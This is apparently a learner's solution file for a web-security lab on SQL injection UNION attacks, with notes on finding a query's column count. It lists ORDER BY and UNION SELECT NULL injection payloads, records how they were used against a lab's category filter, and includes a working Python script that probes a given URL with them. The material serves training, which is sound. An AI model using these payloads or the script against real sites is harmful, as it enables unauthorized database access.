#Retrieving data from other within the database using the UNION keyword is known as SQLI union attack 
# UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query.
#SELECT a, b FROM table1 UNION SELECT c, d FROM table2
"""
 For a UNION query to work, two key requirements must be met:

    The individual queries must return the same number of columns.
    The data types in each column must be compatible between the individual queries.

"""
"""
One method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values: 
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

Moto : Sqli union attack Determining the number of columns returned by the query 
"""

"""
observations :
vulnerbaility is present in the category parameter of the filter 
filter?category=%27%20ORDER%20BY%203--

Ran ' ORDER BY 1--,' ORDER BY 2-- and ' ORDER BY 3-- the payload got reflected on the page 
and when I ran  ' ORDER BY 4-- it lead to internal server error 

then similarly i ran union select null paylaods 

and this solved the lab ' UNION SELECT NULL,NULL,NULL--
"""

import requests
import sys
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  

def exploit_sqli_column_number(url):

    uri="/filter?category="
    for i in range(1,10):
        payload=f"' ORDER BY {i}--" 
        request=requests.get(url+uri+payload,verify=False)
        response=request.text
        if "Internal Server Error" in response:
            return i-1
        i=i+1
    return False




if __name__ == "__main__":
    try:
        url=sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} ")
        print(f"[-] Example: {sys.argv[0]} http://example.com")
        sys.exit(-1)    
    
    print(f"[+] Figuring out the number of columns")
    num_cols=exploit_sqli_column_number(url)
    if num_cols:
        print(f"[+] Number of columns in the query is {num_cols}")
    else:
        print("[-] SQLi union attack is unsuccessful")  